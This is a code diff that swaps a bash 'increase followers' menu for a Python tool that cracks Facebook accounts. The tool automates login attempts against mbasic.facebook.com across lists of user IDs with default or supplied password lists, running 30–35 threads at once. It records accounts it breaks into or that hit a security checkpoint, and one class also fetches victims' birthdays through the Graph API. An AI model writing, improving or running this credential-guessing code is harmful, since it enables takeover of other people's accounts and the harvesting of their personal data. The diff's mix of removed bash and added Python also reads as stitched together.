+	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	p=r.get("https://mbasic.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
+		else:
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in list(r.cookies.get_dict().keys()):
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in list(r.cookies.get_dict().keys()):
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}
 
-sleep 3
-done
-printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;77m Sleeping 60 secs...\e[0m\n"
-sleep 60
+class crack:
+	os.system("clear")
+	banner()
+	def __init__(self,isifile):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		while True:
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			if f=="":continue
+			elif f=="m":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+					continue
+				print((k+"["+p+"•"+k+"]"+p+" Example : 223344,334455,445566,123456"))
+				self.pwlist()
+				break
+			elif f=="d":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-OK] Saved to : MARK-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-CP] Saved to : MARK-CP.txt\n"))
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				exit()
+				break
+	def pwlist(self):
+		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-OK] Saved to : MARK-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-CP] Saved to : MARK-CP.txt\n"))
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			exit()
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=mbasic(fl.get("id"),
+					i,"https://mbasic.facebook.com")
+				if log.get("status")=="cp":
+					print(("\r\x1b[0;33m[\x1b[0;37mMARK-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
+					self.cp.append("%s • %s"%(fl.get("id"),i))
+					open("MARK-CP.txt","a+").write(
+						"%s • %s\n"%(fl.get("id"),i))
+					break
+				elif log.get("status")=="success":
+					print(("\r\x1b[0;32m[\x1b[0;37mMARK-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					self.ada.append("%s • %s"%(fl.get("id"),i))
+					open("MARK-OK.txt","a+").write(
+						"%s • %s\n"%(fl.get("id"),i))
+					break
+				else:continue
+					
+			self.ko+=1
+			
+			
+print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mMARK-OK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mMARK-CP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+		except:
+			self.main(fl)
 
+class crackttl:
+	os.system("clear")
+	banner()
+	def __init__(self,isifile):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		while True:
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			if f=="":continue
+			elif f=="m":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+					continue
+				print((k+"["+p+"•"+k+"]"+p+" Example : 223344,334455,445566,123456"))
+				self.pwlist()
+				break
+			elif f=="d":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-OK] Saved to : MARK-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-CP] Saved to : MARK-CP.txt\n"))
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				exit()
+				break
+	def pwlist(self):
+		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-OK] Saved to : MARK-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [MARK-CP] Saved to : MARK-CP.txt\n"))
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			exit()
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=mbasic(fl.get("id"),
+					i,"https://mbasic.facebook.com")
+				if log.get("status")=="cp":
+					try:
+						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
+						tt=json.loads(ke.text)
+						ttl=tt["birthday"]
+					except:pass
+					print(("\r\x1b[0;33m[\x1b[0;37mMARK-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					self.cp.append("%s • %s"%(fl.get("id"),i))
+					open("MARK-CP.txt","a+").write(
+						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
+					break
+				elif log.get("status")=="success":
+					print(("\r\x1b[0;32m[\x1b[0;37mMARK-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					self.ada.append("%s • %s"%(fl.get("id"),i))
+					if fl.get("id") in open("MARK-OK.txt").read():
+						break
+					else:
+						open("MARK-OK.txt","a+").write(
+						"%s • %s\n"%(fl.get("id"),i))
+					break
+				else:continue
+					
+			self.ko+=1
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mMARK-OK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mMARK-CP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+		except:
+			self.main(fl)
 
-done
+### RESULT ###
 
+def results(Dapunta,Krahkrah):
+        if len(Dapunta) !=0:
+                print(("[OK] : "+str(len(Dapunta))))
+        if len(Krahkrah) !=0:
+                print(("[CP] : "+str(len(Krahkrah))))
+        if len(Dapunta) ==0 and len(Krahkrah) ==0:
+                print("\n")
+                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
 
-}
+def ress():
+    os.system("clear")
+    banner()
+    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
+    print((k+"\n[ "+p+"OK"+k+" ]"+p))
+    try:
+        os.system("cat MARK-OK.txt")
+    except IOError:
+        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
+    print((k+"\n[ "+p+"CP"+k+" ]"+p))
+    try:
+        os.system("cat MARK-CP.txt")
+    except IOError:
+        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
+    input(k+"\n[ "+p+"Back"+k+" ]"+p)
+    menu()
 
-menu() {
-
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Increase Followers\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
-printf "\n"
-
-
-read -p $' \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;77m Choose an option: \e[0m' option
-
-if  $option -eq 1 ; then
-login_user
-increase_followers
-
-elif  $option -eq 2 ; then
-clear
-exit
-
-else
-
-printf "\e[1;93m[!] Invalid Option!\e[0m\n"
-sleep 2
-menu
-
-fi
-}
-
-
-banner
-menu
+if __name__=="__main__":
+	os.system("git pull")
+	menu()
